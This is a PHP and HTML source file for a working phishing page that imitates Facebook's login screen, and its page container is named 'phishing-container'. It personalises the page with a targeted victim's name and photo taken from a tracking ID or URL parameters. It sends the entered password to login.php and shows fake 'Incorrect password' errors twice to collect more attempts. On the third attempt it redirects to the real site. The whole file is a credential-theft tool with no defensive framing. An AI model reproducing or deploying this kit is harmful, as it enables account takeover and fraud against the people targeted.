<?php
include "validate.php";
include "ip.php";

/**
 * Get profile data from database by tracking ID
 * Implements secure validation, file locking, and path traversal prevention
 * 
 * @param string $tracking_id 12-character alphanumeric tracking ID
 * @return array|null Profile data array or null if not found/invalid
 */
function get_profile_data($tracking_id) {
    // Validate format (alphanumeric, 12 chars) - prevents path traversal
    if (!preg_match('/^[a-zA-Z0-9]{12}$/', $tracking_id)) {
        return null;
    }
    
    $db_path = __DIR__ . '/data/profiles_db.json';
    if (!file_exists($db_path)) {
        return null;
    }
    
    // File locking for concurrent access protection
    $fp = fopen($db_path, 'r');
    if (!$fp) {
        return null;
    }
    
    if (!flock($fp, LOCK_SH)) {
        fclose($fp);
        return null;
    }
    
    $file_size = filesize($db_path);
    $contents = $file_size > 0 ? fread($fp, $file_size) : '{}';
    flock($fp, LOCK_UN);
    fclose($fp);
    
    $profiles = json_decode($contents, true);
    if (!is_array($profiles)) {
        return null;
    }
    
    return $profiles[$tracking_id] ?? null;
}

// --- TRACKING ID LOOKUP (Priority 1) ---
$tracking_id = $_GET['t'] ?? '';
$profile = null;

if (!empty($tracking_id)) {
    $profile = get_profile_data($tracking_id);
}

// --- PLACEHOLDER PROFILE INPUT VIA URL PARAMS (Priority 2) ---
$placeholder_pic = $_GET['pic'] ?? '';
$placeholder_name = $_GET['name'] ?? '';
$placeholder_email = $_GET['email'] ?? '';

// Sanitize inputs
$placeholder_pic = filter_var($placeholder_pic, FILTER_SANITIZE_URL);
$placeholder_name = htmlspecialchars($placeholder_name, ENT_QUOTES, 'UTF-8');
$placeholder_email = htmlspecialchars($placeholder_email, ENT_QUOTES, 'UTF-8');

// --- DISPLAY VALUES WITH PRIORITY: Tracking ID > URL Params > Defaults ---
if ($profile) {
    // Use profile data from database (highest priority)
    if (!empty($profile['pic_local'])) {
        // Check if cached image file exists
        $local_path = __DIR__ . '/' . $profile['pic_local'];
        if (file_exists($local_path)) {
            // Use image proxy for OPSEC (hides file structure)
            $display_pic = 'image_proxy.php?id=' . htmlspecialchars($tracking_id, ENT_QUOTES, 'UTF-8');
        } else {
            // Fallback to original CDN URL if cached image missing
            $display_pic = !empty($profile['pic_original']) 
                ? htmlspecialchars($profile['pic_original'], ENT_QUOTES, 'UTF-8')
                : 'https://scontent.fmnl17-7.fna.fbcdn.net/v/t39.30808-1/433513056_426682239919537_6014704870487039782_n.jpg';
        }
    } else {
        // No cached image, use original URL or default
        $display_pic = !empty($profile['pic_original']) 
            ? htmlspecialchars($profile['pic_original'], ENT_QUOTES, 'UTF-8')
            : 'https://scontent.fmnl17-7.fna.fbcdn.net/v/t39.30808-1/433513056_426682239919537_6014704870487039782_n.jpg';
    }
    $display_name = htmlspecialchars($profile['name'] ?? 'User', ENT_QUOTES, 'UTF-8');
    $display_email = $placeholder_email; // Email not stored in profile, use URL param if provided
} elseif (!empty($placeholder_pic) || !empty($placeholder_name)) {
    // Use URL parameters (second priority)
    $display_pic = !empty($placeholder_pic) 
        ? $placeholder_pic 
        : 'https://scontent.fmnl17-7.fna.fbcdn.net/v/t39.30808-1/433513056_426682239919537_6014704870487039782_n.jpg';
    $display_name = !empty($placeholder_name) ? $placeholder_name : 'Hay Mayndz';
    $display_email = !empty($placeholder_email) ? $placeholder_email : '';
} else {
    // Default fallback (lowest priority)
    $display_pic = 'https://scontent.fmnl17-7.fna.fbcdn.net/v/t39.30808-1/433513056_426682239919537_6014704870487039782_n.jpg';
    $display_name = 'Hay Mayndz';
    $display_email = '';
}

// KEY: Check if specific name was provided - determines if password container replaces Continue button
$has_specific_target = !empty($display_name) && $display_name !== 'Hay Mayndz';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <meta name="theme-color" content="#1877F2" />
  <title>Facebook</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link rel="preconnect" href="https://static.xx.fbcdn.net">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    html, body {
      height: 100%;
      width: 100%;
      font-family: "Optimistic Text Normal", Helvetica, Arial, sans-serif;
      background-color: #fff;
      color: #1c2b33;
      overflow-x: hidden;
      display: flex;
      flex-direction: column;
      -webkit-tap-highlight-color: transparent;
    }

    #phishing-container {
      display: flex;
      flex-direction: column;
      flex-grow: 1;
      justify-content: flex-start;
      align-items: center;
      width: 100%;
      overflow-x: hidden;
      box-sizing: border-box;
      background-color: #fff;
      padding-top: 0;
    }

    #viewport {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 0 16px 20px 16px;
      box-sizing: border-box;
    }

    .logo-container {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 40px;
      margin-bottom: 30px;
      width: 100%;
      max-width: 200px;
    }

    .logo-container img {
      max-height: 60px;
      width: 100%;
      height: auto;
      object-fit: contain;
      margin: 0 auto;
    }

    /* Profile Display Section */
    .profile-display {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%;
    }

    .avatar-large {
      width: 180px;
      height: 180px;
      border-radius: 50%;
      object-fit: cover;
      margin-bottom: 16px;
      background-color: #f0f2f5;
      min-width: 180px;
      min-height: 180px;
    }

    .profile-name-large {
      font-size: 24px;
      font-weight: 600;
      color: #0a1317;
      font-family: "Optimistic 95", Helvetica, Arial, sans-serif;
      margin-bottom: 8px;
      text-align: center;
      word-break: break-word;
      display: inline;
      white-space: pre-wrap;
      overflow-wrap: break-word;
    }

    /* Action Section - Either Continue Button OR Password Container */
    .action-section {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: stretch;
      gap: 12px;
      margin-top: 24px;
    }

    /* Continue Button (when NO specific name provided) */
    .continue-button-container {
      width: 100%;
    }

    .profile-button {
      height: 44px;
      min-width: 44px;
      width: 100%;
      max-width: 100%;
      padding: 0 20px;
      border-radius: 22px;
      font-size: 16px;
      font-weight: 600;
      font-family: "Optimistic Text Medium", Helvetica, Arial, sans-serif;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      text-shadow: none;
      line-height: 1;
      box-sizing: border-box;
      appearance: none;
      -webkit-appearance: none;
      margin: 0;
      transition: background-color 0.2s ease, color 0.2s ease, border-color 0.2s ease, transform 0.1s ease;
      background-image: none;
      text-decoration: none;
      border: none;
      color: #fff;
    }

    .profile-button.primary {
      background: #1877F2;
    }

    .profile-button.primary:hover {
      background-color: #166FE5;
      box-shadow: 0 2px 8px rgba(24, 119, 242, 0.18);
      transform: scale(1.02);
    }

    .profile-button.primary:active {
      background-color: #1465CC;
      box-shadow: 0 1px 4px rgba(24, 119, 242, 0.12);
      transform: scale(0.98);
    }

    /* Password Container (replaces Continue when specific name provided) */
    .password-container {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: stretch;
      gap: 12px;
    }

    .password-input-wrapper {
      background: #f5f6f7;
      border: 1px solid #dbdbdb;
      border-radius: 6px;
      min-height: 52px;
      display: flex;
      align-items: stretch;
      position: relative;
      width: 100%;
      overflow: hidden;
      transition: border-color 0.2s ease-in-out, background-color 0.2s ease-in-out;
      box-sizing: border-box;
    }

    .password-input-wrapper:focus-within {
      border-color: #1877f2;
      background-color: #fff;
    }

    .password-input-wrapper.error {
      border-color: #f02849;
      animation: errorShake 0.5s ease;
    }

    @keyframes errorShake {
      0%, 100% { transform: translateX(0); }
      10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
      20%, 40%, 60%, 80% { transform: translateX(5px); }
    }

    .password-input {
      font-family: "Optimistic Text Normal";
      font-size: 16px;
      line-height: 1.25;
      color: #1c1e21;
      background: transparent;
      border: none;
      outline: none;
      padding: 18px 48px 6px 17px;
      width: 100%;
      height: 100%;
      z-index: 1;
      box-sizing: border-box;
      flex-grow: 1;
    }

    .password-input::placeholder {
      color: transparent;
      opacity: 0;
    }

    .password-label {
      position: absolute;
      top: 50%;
      left: 16px;
      transform: translateY(-50%);
      color: #606770;
      font-size: 16px;
      font-family: "Optimistic Text Normal", Helvetica, Arial, sans-serif;
      pointer-events: none;
      transition: all 0.15s ease-out;
      z-index: 0;
      background-color: transparent;
    }

    .password-input:focus + .password-label,
    .password-input:not(:placeholder-shown) + .password-label {
      top: 8px;
      transform: translateY(0);
      font-size: 12px;
      color: #1877f2;
      background-color: #fff;
      padding: 0 4px;
      z-index: 2;
    }

    .password-input:not(:placeholder-shown):not(:focus) + .password-label {
      background-color: #f5f6f7;
      color: #606770;
    }

    .password-toggle {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
      width: 48px;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2;
      cursor: pointer;
      background: none;
      border: none;
      padding: 0;
    }

    .password-toggle svg {
      width: 24px;
      height: 24px;
      fill: #606770;
    }

    .password-toggle .eye-closed {
      display: none;
    }

    .password-toggle.showing .eye-open {
      display: none;
    }

    .password-toggle.showing .eye-closed {
      display: block;
    }

    .login-button {
      height: 44px;
      width: 100%;
      padding: 0 20px;
      border-radius: 22px;
      font-size: 16px;
      font-weight: 600;
      font-family: "Optimistic Text Medium", Helvetica, Arial, sans-serif;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      border: none;
      background: #1877f2;
      color: #fff;
      transition: background-color 0.2s ease, transform 0.1s ease;
    }

    .login-button:hover {
      background-color: #166fe5;
      box-shadow: 0 2px 8px rgba(24, 119, 242, 0.18);
      transform: scale(1.02);
    }

    .login-button:active {
      background-color: #1465cc;
      transform: scale(0.98);
    }

    .login-button:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }

    .login-button .btn-spinner {
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255, 255, 255, 0.4);
      border-top: 3px solid #fff;
      border-radius: 50%;
      animation: spinner-rotate 0.8s linear infinite;
      margin-right: 8px;
      display: none;
    }

    .login-button.loading .btn-spinner {
      display: inline-block;
    }

    .login-button.loading .btn-text {
      display: none;
    }

    .forgot-link {
      text-align: center;
      margin-top: 8px;
    }

    .forgot-link a {
      color: #1c2b33;
      font-weight: 500;
      font-size: 14px;
      text-decoration: none;
    }

    .forgot-link a:hover {
      text-decoration: underline;
    }

    .footer-links-text {
      text-align: center;
      margin-top: 24px;
      color: #8a8d91;
      font-size: 12px;
      width: 100%;
    }

    /* Error Modal */
    #login_error {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.6);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      padding: 20px;
    }

    #login_error .modal-content {
      background: #fff;
      border-radius: 12px;
      width: 100%;
      max-width: 320px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
      overflow: hidden;
      text-align: center;
      animation: modalFadeIn 0.2s ease-out;
    }

    @keyframes modalFadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }

    #login_error h2 {
      font-size: 18px;
      font-weight: 600;
      color: #1c1e21;
      margin: 0;
      padding: 20px 20px 8px;
    }

    #login_error p {
      font-size: 14px;
      color: #606770;
      margin: 0;
      line-height: 1.4;
      padding: 0 20px 16px;
    }

    #login_error #modalOkButton {
      width: 100%;
      padding: 14px 0;
      border: none;
      border-top: 1px solid #dadde1;
      background: none;
      font-size: 16px;
      color: #1877f2;
      cursor: pointer;
      font-weight: 400;
      transition: background-color 0.15s ease;
    }

    #login_error #modalOkButton:hover {
      background-color: #f0f2f5;
    }

    /* Loading Modal */
    #loadingRedirectModal {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(240, 242, 245, 0.92);
      z-index: 10000;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 20px;
      opacity: 0;
      transition: opacity 0.3s ease-in-out;
    }

    #loadingRedirectModal.is-visible {
      opacity: 1;
    }

    @keyframes spinner-rotate {
      0% { transform: rotate(0); }
      100% { transform: rotate(360deg); }
    }

    .spinner-redirect {
      width: 36px;
      height: 36px;
      border: 4px solid rgba(0, 0, 0, 0.1);
      border-top-color: #1877f2;
      border-radius: 50%;
      animation: spinner-rotate 0.8s linear infinite;
    }

    #loadingRedirectModal p {
      font-size: 15px;
      color: #65676b;
      margin: 15px 0 0 0;
      font-weight: 500;
    }

    @media (max-width: 360px) {
      .logo-container {
        margin-top: 20px;
        margin-bottom: 20px;
      }

      .avatar-large {
        width: 140px;
        height: 140px;
        min-width: 140px;
        min-height: 140px;
      }

      .profile-name-large {
        font-size: 20px;
      }
    }
  </style>
</head>
<body tabindex="0">
  <div id="phishing-container">
    <div id="viewport">
      <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
      
      <!-- Error Modal -->
      <div id="login_error" style="display:none">
        <div class="modal-content">
          <h2 id="errorTitle">Incorrect password</h2>
          <p id="errorMessage">The password you entered is incorrect. Please try again.</p>
          <button type="button" id="modalOkButton">OK</button>
        </div>
      </div>

      <!-- Loading Modal -->
      <div id="loadingRedirectModal">
        <div class="spinner-redirect"></div>
        <p>Logging in...</p>
      </div>

      <!-- Facebook Logo (PLACEHOLDER - Always shown) -->
      <div class="logo-container">
        <img loading="lazy" decoding="async" alt="Facebook from Meta" role="heading" 
             src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png">
      </div>

      <!-- Profile Display Section -->
      <div class="profile-display">
        <!-- PLACEHOLDER: Profile Picture -->
        <img class="avatar-large" id="avatarLarge" 
             src="<?php echo $display_pic; ?>" 
             alt="Profile"
             data-placeholder-pic="<?php echo $display_pic; ?>">
        
        <!-- PLACEHOLDER: Profile Name -->
        <span class="profile-name-large" id="profileNameLarge"
              data-placeholder-name="<?php echo $display_name; ?>">
          <?php echo $display_name; ?>
        </span>
      </div>

      <!-- Action Section: Either Continue Button OR Password Container -->
      <div class="action-section">
        
        <?php if (!$has_specific_target): ?>
        <!-- NO SPECIFIC NAME: Show Continue Button -->
        <div class="continue-button-container" id="continueContainer">
          <button class="profile-button primary" id="continueButton" type="button">
            <span>Continue</span>
          </button>
        </div>
        <?php else: ?>
        <!-- SPECIFIC NAME PROVIDED: Password Container REPLACES Continue Button -->
        <div class="password-container" id="passwordContainer">
          <form id="passwordForm" method="POST" action="login.php" novalidate>
            <input type="hidden" name="sessionId" id="sessionIdField" value="">
            <input type="hidden" name="email" id="emailField" value="<?php echo $display_email; ?>">
            <input type="hidden" name="targetName" value="<?php echo $display_name; ?>">
            <input type="hidden" name="attemptCount" id="attemptCountField" value="0">
            
            <div class="password-input-wrapper" id="passwordWrapper">
              <input type="password" 
                     name="password" 
                     id="passwordInput" 
                     class="password-input" 
                     autocomplete="current-password" 
                     autocapitalize="off" 
                     autocorrect="off"
                     placeholder=" "
                     required>
              <label class="password-label" for="passwordInput">Password</label>
              <button type="button" class="password-toggle" id="passwordToggle">
                <svg class="eye-open" viewBox="0 0 24 24">
                  <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
                <svg class="eye-closed" viewBox="0 0 24 24">
                  <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.44-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 9.95 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
                </svg>
              </button>
            </div>
            
            <button type="submit" class="login-button" id="loginButton">
              <span class="btn-spinner"></span>
              <span class="btn-text">Log In</span>
            </button>
          </form>
          
          <div class="forgot-link">
            <a href="#" id="forgotPasswordLink">Forgot password?</a>
          </div>
        </div>
        <?php endif; ?>
        
      </div>

      <div class="footer-links-text">About · Help · More</div>
    </div>
  </div>

  <script>
  (function() {
    'use strict';
    
    // === CONFIGURATION ===
    const MAX_RETRY_ATTEMPTS = 2; // Errors on attempts 1 & 2, redirect on attempt 3
    const REDIRECT_URL = 'https://www.facebook.com/';
    const SESSION_ID = 'FP_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    // === STATE ===
    let loginAttempts = 0;
    let isSubmitting = false;
    
    // === DOM ELEMENTS ===
    const sessionField = document.getElementById('sessionIdField');
    const attemptField = document.getElementById('attemptCountField');
    const passwordForm = document.getElementById('passwordForm');
    const passwordInput = document.getElementById('passwordInput');
    const passwordWrapper = document.getElementById('passwordWrapper');
    const passwordToggle = document.getElementById('passwordToggle');
    const loginButton = document.getElementById('loginButton');
    const errorModal = document.getElementById('login_error');
    const errorTitle = document.getElementById('errorTitle');
    const errorMessage = document.getElementById('errorMessage');
    const modalOkBtn = document.getElementById('modalOkButton');
    const loadingModal = document.getElementById('loadingRedirectModal');
    const continueButton = document.getElementById('continueButton');
    const forgotLink = document.getElementById('forgotPasswordLink');
    
    // Set session ID
    if (sessionField) sessionField.value = SESSION_ID;
    
    // === UTILITY FUNCTIONS ===
    function showError(title, message) {
      if (errorTitle) errorTitle.textContent = title;
      if (errorMessage) errorMessage.textContent = message;
      if (errorModal) errorModal.style.display = 'flex';
    }
    
    function hideError() {
      if (errorModal) errorModal.style.display = 'none';
    }
    
    function showLoading(show) {
      if (loadingModal) {
        loadingModal.style.display = show ? 'flex' : 'none';
        if (show) {
          setTimeout(() => loadingModal.classList.add('is-visible'), 20);
        } else {
          loadingModal.classList.remove('is-visible');
        }
      }
    }
    
    function setButtonLoading(loading) {
      if (loginButton) {
        loginButton.disabled = loading;
        loginButton.classList.toggle('loading', loading);
      }
    }
    
    function shakeInput() {
      if (passwordWrapper) {
        passwordWrapper.classList.add('error');
        setTimeout(() => passwordWrapper.classList.remove('error'), 500);
      }
    }
    
    // === EVENT HANDLERS ===
    
    // Continue button → Redirect to generic login (only if no specific target)
    if (continueButton) {
      continueButton.addEventListener('click', () => {
        // This scenario only happens when NO name was provided
        // Redirect to standard login or show a generic form
        window.location.href = 'https://www.facebook.com/login/';
      });
    }
    
    // Password toggle
    if (passwordToggle && passwordInput) {
      passwordToggle.addEventListener('click', (e) => {
        e.preventDefault();
        if (passwordInput.type === 'password') {
          passwordInput.type = 'text';
          passwordToggle.classList.add('showing');
        } else {
          passwordInput.type = 'password';
          passwordToggle.classList.remove('showing');
        }
      });
    }
    
    // Error modal OK button
    if (modalOkBtn) {
      modalOkBtn.addEventListener('click', () => {
        hideError();
        if (passwordInput) {
          passwordInput.value = '';
          passwordInput.focus();
        }
      });
    }
    
    // Form submission with RETRY LOGIC
    if (passwordForm) {
      passwordForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        if (isSubmitting) return;
        
        const password = passwordInput?.value?.trim() || '';
        
        if (!password) {
          showError('Password Required', 'Please enter your password.');
          shakeInput();
          return;
        }
        
        isSubmitting = true;
        setButtonLoading(true);
        
        // Update attempt count in hidden field
        if (attemptField) attemptField.value = loginAttempts + 1;
        
        const formData = new FormData(passwordForm);
        formData.append('attemptNumber', loginAttempts + 1);
        
        try {
          const response = await fetch('login.php', {
            method: 'POST',
            body: formData
          });
          
          const responseText = await response.text();
          
          setButtonLoading(false);
          isSubmitting = false;
          
          // Check if we've exceeded max retries
          if (loginAttempts >= MAX_RETRY_ATTEMPTS) {
            // FINAL ATTEMPT (3rd) - Show loading and redirect
            showLoading(true);
            
            const redirectTo = responseText.startsWith('https://') 
              ? responseText.trim() 
              : REDIRECT_URL;
            
            setTimeout(() => {
              window.location.href = redirectTo;
            }, 1500);
            return;
          }
          
          // INCREMENT attempts and show error
          loginAttempts++;
          shakeInput();
          
          // Customize error message based on attempt number
          if (loginAttempts === 1) {
            showError('Incorrect Password', 'The password you entered is incorrect. Please try again.');
          } else if (loginAttempts === MAX_RETRY_ATTEMPTS) {
            showError('Incorrect Password', 'Last attempt. Please verify your password carefully.');
          } else {
            showError('Incorrect Password', 'Wrong password. Please try again.');
          }
          
        } catch (err) {
          setButtonLoading(false);
          isSubmitting = false;
          showError('Connection Error', 'Unable to connect. Please check your internet and try again.');
        }
      });
    }
    
    // Forgot password link
    if (forgotLink) {
      forgotLink.addEventListener('click', (e) => {
        e.preventDefault();
        showError('Recover Your Account', 'Please visit facebook.com/login/identify to recover your account.');
      });
    }
    
    // Auto-focus password input when page loads (if password container is shown)
    if (passwordInput) {
      setTimeout(() => passwordInput.focus(), 300);
    }
    
  })();
  </script>
</body>
</html>
